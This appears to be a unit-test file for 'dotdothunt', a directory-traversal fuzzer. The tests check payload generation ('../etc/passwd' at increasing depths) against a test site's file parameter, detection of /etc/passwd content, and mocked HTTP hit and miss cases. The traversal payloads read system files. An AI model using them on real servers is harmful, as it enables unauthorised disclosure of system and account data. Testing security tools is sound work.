import unittest
import asyncio
from unittest.mock import Mock, patch, AsyncMock
import re
from dotdothunt.generators.words_generator import Generator
from dotdothunt.engines.http_engine import HTTPEngine

# Sample /etc/passwd content for testing (short version)
SAMPLE_PASSWD_CONTENT = """root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh"""

class TestDotDotHunt(unittest.IsolatedAsyncioTestCase):
    def setUp(self):
        self.loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self.loop)

    def tearDown(self):
        self.loop.run_until_complete(asyncio.sleep(0))  # Ensure all tasks complete
        self.loop.close()

    def test_generator_payloads(self):
        inputs = {'url': ["http://testphp.vulnweb.com/showimage.php?file=FUZZ"]}
        generator = Generator('http', inputs, depth=5, os_type="linux", custom_file="/etc/passwd")
        payloads = generator.get_payloads()
        expected = [
            "etc/passwd",
            "../etc/passwd",
            "../../etc/passwd",
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "../../../../../etc/passwd"
        ]
        self.assertEqual(len(payloads), 6)
        self.assertEqual(payloads, expected)

    def test_content_validation(self):
        engine = HTTPEngine("", [], [], filters=(["200"], ["100"]))  # Adjusted size filter
        self.assertTrue(engine._is_valid_passwd_content(SAMPLE_PASSWD_CONTENT))
        self.assertFalse(engine._is_valid_passwd_content("Not a passwd file"))

    @patch('aiohttp.ClientSession.get')
    async def test_http_engine_hit(self, mock_get):
        mock_response = AsyncMock()
        mock_response.status = 200
        mock_response.text = AsyncMock(return_value=SAMPLE_PASSWD_CONTENT)
        mock_get.return_value.__aenter__.return_value = mock_response

        url = "http://testphp.vulnweb.com/showimage.php?file=FUZZ"
        payloads = ["../../etc/passwd"]
        callback = Mock()
        engine = HTTPEngine(url, payloads, [callback], filters=(["200"], ["100"]))  # Adjusted size filter
        
        await engine.run()
        callback.assert_called_once_with({
            'url': "http://testphp.vulnweb.com/showimage.php?file=../../etc/passwd",
            'status': 200,
            'size': len(SAMPLE_PASSWD_CONTENT.encode('utf-8')),
            'content': SAMPLE_PASSWD_CONTENT
        })

    @patch('aiohttp.ClientSession.get')
    async def test_http_engine_no_hit(self, mock_get):
        mock_response = AsyncMock()
        mock_response.status = 200
        mock_response.text = AsyncMock(return_value="Invalid content")
        mock_get.return_value.__aenter__.return_value = mock_response

        url = "http://testphp.vulnweb.com/showimage.php?file=FUZZ"
        payloads = ["../../etc/passwd"]
        callback = Mock()
        engine = HTTPEngine(url, payloads, [callback], filters=(["200"], ["100"]))  # Adjusted size filter
        
        await engine.run()
        callback.assert_not_called()

if __name__ == '__main__':
    unittest.main()
